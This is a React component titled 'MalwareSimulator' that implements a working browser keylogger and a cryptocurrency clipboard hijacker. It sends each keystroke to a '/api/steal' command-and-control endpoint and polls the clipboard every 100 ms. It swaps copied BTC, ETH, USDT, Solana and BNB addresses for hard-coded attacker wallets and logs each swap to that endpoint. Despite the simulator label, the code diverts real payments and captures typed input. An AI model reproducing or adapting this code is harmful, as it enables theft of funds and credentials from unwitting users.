
"use client";

import React, { useState, useEffect, useRef } from "react";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
  CardDescription,
  CardFooter,
} from "@/components/ui/card";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogFooter,
  DialogTitle,
  DialogDescription,
  DialogClose,
} from "@/components/ui/dialog";
import { InputReplay } from "@/components/input-replay";
import { Keyboard, ClipboardCopy, Download } from "lucide-react";
import jsPDF from "jspdf";
import { useToast } from "@/hooks/use-toast";

interface HijackedData {
  original: string;
  replaced: string;
  timestamp: string;
}

const C2_SERVER = "/api/steal";
const PASSKEY = "2014";

const scammerAddresses = {
  btc: "bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0",
  eth: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
  usdt_erc20: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
  usdt_trc20: "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
  erc20: "0xb9FBAa68123ad7BdaCb5820dE4f7998887733333",
  trc20: "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
  sol: "Gc1Xak8dXJY7h6G8XXMefa9BaiT8VMEsm6G4DXMzyCaX",
  bnbsc: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
};

function getScammerAddress(copied: string): string | null {
  if (/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(copied)) return scammerAddresses.btc;
  if (/^0x[a-fA-F0-9]{40}$/.test(copied)) {
    const lower = copied.toLowerCase();
    if (lower.includes("usdt")) return scammerAddresses.usdt_erc20;
    if (lower.includes("bnb")) return scammerAddresses.bnbsc;
    if (lower.includes("erc20")) return scammerAddresses.erc20;
    return scammerAddresses.eth;
  }
  if (/^T[a-zA-Z0-9]{33}$/.test(copied)) {
    if (copied.toLowerCase().includes("usdt")) return scammerAddresses.usdt_trc20;
    return scammerAddresses.trc20;
  }
  if (/^[A-Za-z0-9]{43,44}$/.test(copied)) {
    return scammerAddresses.sol;
  }
  return null;
}

const sendToC2 = (data: object) => {
  fetch(C2_SERVER, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  }).catch(error => console.error("C2 Error:", error));
};

export function MalwareSimulator() {
  const [keystrokes, setKeystrokes] = useState<string>("");
  const [hijacked, setHijacked] = useState<HijackedData[]>([]);
  const lastClipboardText = useRef<string>("");
  const [isPasskeyDialogOpen, setIsPasskeyDialogOpen] = useState(false);
  const [passkey, setPasskey] = useState("");
  const { toast } = useToast();
  const [isClient, setIsClient] = useState(false);

  useEffect(() => {
    setIsClient(true);
    const savedKeystrokes = localStorage.getItem("capturedKeystrokes") || "";
    setKeystrokes(savedKeystrokes);

    const savedHijacked = localStorage.getItem("hijackedData");
    setHijacked(savedHijacked ? JSON.parse(savedHijacked) : []);
  }, []);

  useEffect(() => {
    if (isClient) {
      localStorage.setItem("capturedKeystrokes", keystrokes);
    }
  }, [keystrokes, isClient]);

  useEffect(() => {
    if (isClient) {
      localStorage.setItem("hijackedData", JSON.stringify(hijacked));
    }
  }, [hijacked, isClient]);


  const generateAndDownloadPdf = () => {
    const doc = new jsPDF();
    const margin = 15;
    let yPos = 20;

    doc.setFontSize(22);
    doc.text("Keystroke Sentinel Report", doc.internal.pageSize.getWidth() / 2, yPos, { align: "center" });
    yPos += 15;

    doc.setFontSize(16);
    doc.text("Captured Keystrokes:", margin, yPos);
    yPos += 8;

    doc.setFontSize(10);
    const keystrokeLines = doc.splitTextToSize(keystrokes || "No keystrokes captured.", doc.internal.pageSize.getWidth() - margin * 2);
    doc.text(keystrokeLines, margin, yPos);
    yPos += (keystrokeLines.length * 5) + 10;
    
    doc.addPage();
    yPos = 20;

    doc.setFontSize(16);
    doc.text("Clipboard Interceptions:", margin, yPos);
    yPos += 10;
    
    if (hijacked.length > 0) {
        hijacked.forEach(item => {
            if(yPos > 270) {
                doc.addPage();
                yPos = 20;
            }
            doc.setFontSize(12);
            doc.text(`Timestamp: ${new Date(item.timestamp).toLocaleString()}`, margin, yPos);
            yPos += 7;

            doc.setFontSize(10);
            doc.text(`Original: ${item.original}`, margin, yPos);
            yPos += 5;
            doc.text(`Replaced: ${item.replaced}`, margin, yPos);
            yPos += 10;
        })
    } else {
        doc.setFontSize(12);
        doc.text("No clipboard data hijacked yet.", margin, yPos);
    }

    doc.save(`keystroke-sentinel-report-${new Date().toISOString()}.pdf`);
  };
  
  const handleDownloadClick = () => {
    setIsPasskeyDialogOpen(true);
  };
  
  const handlePasskeySubmit = () => {
    if (passkey === PASSKEY) {
      generateAndDownloadPdf();
      setIsPasskeyDialogOpen(false);
      setPasskey("");
    } else {
      toast({
        title: "Incorrect Passkey",
        description: "Please enter the correct passkey to download the report.",
        variant: "destructive",
      });
    }
  };


  useEffect(() => {
    const handleKeyDown = (event: KeyboardEvent) => {
      let key = event.key;
      if (key.length > 1) {
        key = `[${key}]`;
      }
      setKeystrokes((prev) => prev + key);
      
      const data = {
        type: "keylogger",
        key: event.key,
        victim: "PC-User-01",
        timestamp: new Date().toISOString(),
      };
      sendToC2(data);
    };

    document.addEventListener("keydown", handleKeyDown);
    return () => {
      document.removeEventListener("keydown", handleKeyDown);
    };
  }, []);

  useEffect(() => {
    const intervalId = setInterval(async () => {
      try {
        const copied = await navigator.clipboard.readText();
        if (copied && copied !== lastClipboardText.current) {
          lastClipboardText.current = copied;
          const scammerAddress = getScammerAddress(copied);

          if (scammerAddress && copied !== scammerAddress) {
            await navigator.clipboard.writeText(scammerAddress);
            const hijackData = {
              original: copied,
              replaced: scammerAddress,
              timestamp: new Date().toISOString(),
            };
            setHijacked((prev) => [hijackData, ...prev]);

            const c2Data = {
              type: "clipbanker",
              ...hijackData,
              victim: "PC-User-01",
            };
            sendToC2(c2Data);
          }
        }
      } catch (err) {
        if (err instanceof Error && err.name !== 'NotAllowedError') {
             console.error("Clipboard error:", err);
        }
      }
    }, 100);

    return () => clearInterval(intervalId);
  }, []);

  if (!isClient) {
    return null; // or a loading spinner
  }

  return (
    <>
      <div className="grid gap-8 lg:grid-cols-2">
        <div className="lg:col-span-2 grid gap-8 md:grid-cols-2">
          <Card>
            <CardHeader className="flex flex-row items-center justify-between">
              <div className="flex items-center gap-3">
                <Keyboard className="h-6 w-6 text-accent" />
                <CardTitle>Keystroke Log</CardTitle>
              </div>
              <Badge variant="destructive">LIVE</Badge>
            </CardHeader>
            <CardContent>
              <ScrollArea className="h-40 w-full rounded-md border p-4 bg-background/50">
                <p className="text-sm font-mono break-all">{keystrokes || "No keystrokes captured yet."}</p>
              </ScrollArea>
            </CardContent>
          </Card>
          <InputReplay capturedKeystrokes={keystrokes} />
        </div>

        <Card className="lg:col-span-2">
          <CardHeader>
            <div className="flex items-center gap-3">
                <ClipboardCopy className="h-6 w-6 text-accent" />
                <CardTitle>Clipboard Interceptions</CardTitle>
              </div>
            <CardDescription>
              Monitoring clipboard for cryptocurrency addresses to replace.
            </CardDescription>
          </CardHeader>
          <CardContent>
            <ScrollArea className="h-80">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Original Address</TableHead>
                    <TableHead>Replaced With</TableHead>
                    <TableHead className="text-right">Timestamp</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {hijacked.length > 0 ? (
                    hijacked.map((item, index) => (
                      <TableRow key={index}>
                        <TableCell className="font-mono text-sm break-all">{item.original}</TableCell>
                        <TableCell className="font-mono text-sm break-all text-destructive">{item.replaced}</TableCell>
                        <TableCell className="text-right">{new Date(item.timestamp).toLocaleTimeString()}</TableCell>
                      </TableRow>
                    ))
                  ) : (
                    <TableRow>
                      <TableCell colSpan={3} className="text-center h-24 text-muted-foreground">
                        No clipboard data hijacked yet.
                      </TableCell>
                    </TableRow>
                  )}
                </TableBody>
              </Table>
            </ScrollArea>
          </CardContent>
          <CardFooter>
              <Button onClick={handleDownloadClick} className="w-full">
                  <Download className="mr-2 h-4 w-4" />
                  Download Report
              </Button>
          </CardFooter>
        </Card>
      </div>
      <Dialog open={isPasskeyDialogOpen} onOpenChange={setIsPasskeyDialogOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Enter Passkey</DialogTitle>
            <DialogDescription>
              Please enter the passkey to download the report.
            </DialogDescription>
          </DialogHeader>
          <div className="grid gap-4 py-4">
            <div className="grid grid-cols-4 items-center gap-4">
              <Label htmlFor="passkey-input" className="text-right">
                Passkey
              </Label>
              <Input
                id="passkey-input"
                type="password"
                value={passkey}
                onChange={(e) => setPasskey(e.target.value)}
                className="col-span-3"
              />
            </div>
          </div>
          <DialogFooter>
            <DialogClose asChild>
              <Button variant="outline">Cancel</Button>
            </DialogClose>
            <Button onClick={handlePasskeySubmit}>Submit</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </>
  );
}
